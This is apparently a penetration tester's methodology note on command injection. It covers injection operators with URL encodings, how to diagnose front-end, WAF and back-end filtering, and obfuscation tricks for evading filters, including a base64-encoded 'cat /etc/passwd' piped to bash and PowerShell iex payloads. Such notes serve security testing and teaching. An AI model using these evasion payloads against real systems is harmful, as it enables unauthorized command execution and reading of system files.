---
title: Command Injection
draft: 
tags:
  - Command
  - commandline
  - commandlineinjection
  - injection
---
# Command Injection

## Summary
This is the main landing page that makes up my methodology of testing for command injection.

## Detection
Testing for command injection is similar to exploiting it and can be tested by using (but not limited to) using the following commands:

| Operator   | Injection | URL Encoded | command executed                       |
| ---------- | --------- | ----------- | -------------------------------------- |
| Semicolon  | ;         | %3b         | Both                                   |
| New Line   | \n        | %0a         | Both                                   |
| Background | &         | %26         | Both -> Second output shown firsdt     |
| Pipe       | \|        | %7c         | Both -> Only second output is shown    |
| AND        | &&        | %26%26      | Both but only if first command success |
| OR         | \|\|      | %7c%7c      | Second but only if first fails         |
| Sub-Shell  | ``        | %60%60      | Both -> Linux Only                     |
| Sub-Shell  | $()       | %24%28%29   | Both -> Linux Only                     |

## Test your commands
Before sending the command over and any augmentation or obfuscation that you do you should test your commands in a similar environment such and Linux or Windows to make sure the command does what you want it to do.

## The Three Choke points
When it comes to Command Injection there are three areas that can impact the success of the command running.

1) Front-end filtering
2) WAF
3) Backend filtering

### Frontend Filtering
If we get an error back but we see that in developer tools there are no calls in the network then we know that we are being filtered by some kind of front end logic. a way to get around this is by using a proxy like Caido or Burpsuite

### WAF Filtering
If we get an error that sends us to a new page and includes something like our IP address then chances are this is a WAF that is unhappy with our command.

### Backend Filtering
If we get a message back like "Invalid text" or some type of error and we see we are indeed getting network traffic then we can assume that the backend is filtering out our injection

## Filtering
Below are going to be common filters and ways to go around them

### Space Filter Bypassing
`%09` - the url encoding for tab
`%0A` - the url encoding for a new line
`${IFS}` - the Internal Field Separator in command... or just a space variable.
`{ls,-la}` - Brace expansion - this will add a space where the comma is

### Bypassing Other Characters
in linux we can use a notation on variables like grabbing something out of an array.

`printenv` -> can give us a list of environment variables that live in them and we can extract characters from this. I eventually would like to make a chart here of the best variables found across most if not all linux flavors as an easy chart but for the time being I have this:

| Character | Environment Variable |
| --------- | -------------------- |
| /         | `${PATH:0:1}`        |
| ;         | `${LS_COLORS:10:1}`  |

### Bypassing filtered Commands
Sometimes a string might be filtered due to it being a command. In cases like this we can attempt to evade this the following way:

`e"c"h"o"` - Double quotes
`e'c'h'o'` - Single quotes

#### Linux only
1) `e\c\h\o` - Backslashes
2) `ec$@ho` - Position parameter character
3) `$(tr "[A-Z]" "[a-z]"<<<"EcHo")` - Alternate casing in Linux
4) `$(rev<<<'imaohw')` - Reversing a command
5) `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` - Encoding a command 
   
Linux command to reverse a string:
```bash
echo 'whoami' | rev
```

Linux command to base64 encode a string:
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

#### Windows Only
1) `ec^cho` - Up ticks
2) `eChO` - Alternating case
3) ` iex "$('imaohw'[-1..-20] -join '')"` - Reversing a command Windows
4) ` iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` - Encoding a command

Windows command to reverse a string
```powershell-session
"whoami"[-1..-20] -join ''
```

Windows command to base64 encode a string
```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```
